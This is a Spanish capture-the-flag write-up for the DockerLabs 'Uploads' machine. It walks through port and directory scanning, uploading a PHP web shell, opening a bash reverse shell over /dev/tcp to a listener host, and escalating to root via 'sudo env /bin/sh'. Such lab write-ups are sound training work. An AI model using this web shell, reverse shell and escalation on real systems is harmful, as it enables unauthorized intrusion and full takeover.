#Uploads DockerLabs - 12/05/2024

#web - https://dockerlabs.es/#/

Primero hacemos un escaneo de puertos básico hacia la ip que por defecto es la *172.17.0.2*.

```shell
└─$ nmap -sV -sC -n -p- --min-rate 5000 172.17.0.2
===============================================================
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 00:09 CEST
Nmap scan report for 172.17.0.2
Host is up (0.00013s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Upload here your file
|_http-server-header: Apache/2.4.52 (Ubuntu)

```

Vemos que hay un puerto 80 abierto y entramos desde firefox.


Entramos y vemos una pagina web con un apartado para subir archivos.

![Captura de pantalla 2024-05-13 001149](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/289a79e0-f7c1-4cf6-808f-946ab1c4059f)

Realizamos un escaneo de subdominios con gobuster para ver si encontramos algo interesante.

```shell
└─$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]

```

Encontramos un subdominio *http://172.17.0.2/uploads/*.
Entramos y podemos ver que es donde se alojan los archivos subidos.

![Captura de pantalla 2024-05-13 002043](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/418a59e7-daa7-4819-b895-376a3286d882)

Creamos un script en formato ".php" con el siguiente contenido

```shell
<?php
	system($_GET['cmd']);
?>
```

Lo subimos y llamamos al archivo con un "?cmd=id" quedando de esta manera:

![Captura de pantalla 2024-05-13 204619](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/7b55fd0a-62eb-4f95-bdbc-cc921362b579)

```shell
http://172.17.0.2/uploads/cmd.php?cmd=id
```

Entramos a "https://www.revshells.com/" en esta web encontramos reverse shells ya generadas y listas para copiar y para cambiar los parametros de una manera sencilla

![Captura de pantalla 2024-05-13 204754](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/0a20f8dd-895e-4ead-8ab9-b8e171bc2423)
![Captura de pantalla 2024-05-13 204807](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/28ff216f-eaf8-4fe3-95ac-4520704adc72)


Ejecutamos netcat con el puerto 9001 como puerto de escucha:

```shell
└─$ nc -lvnp 9001
listening on [any] 9001 ...

```

Ejecutamos la reverse shell de manera en que llamemos al archivo "cmd.php" y le pasasemos los parametros anteriores "?cmd=id" y ahora sustituimos id por bash -c seguido de dos comillas y la reverse shell:

```shell
http://172.17.0.2/uploads/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.0.2.15/9001 0>%261" )

```

![Captura de pantalla 2024-05-13 210138](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/853d7ccc-3224-4c5d-8495-0247a5960d9d)

Ahora solo faltaría la escalada de privilegios
Comprobamos los permisos del usuario con:

```shell
└─$ sudo -l
```

![Captura de pantalla 2024-05-13 210530](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/449ea752-5a93-4e67-a77e-d306b1111214)

En este caso podemos ver que podemos ejecutar el binario "/usr/bin/env" siendo este usuario "root" como se puede apreciar y indica que no tiene contraseña entonces prodecedemos a ejecutar este binario:

```shell
└─$ sudo env /bin/sh
```

![Captura de pantalla 2024-05-13 210851](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/6006d2f9-c5bf-44da-b6a8-e916850a9d0e)

y ahora realizamos un whoami para saber que usuario somos:
```shell
# whoami
root
```
y podremos comprobar que si que somos el usuario root.
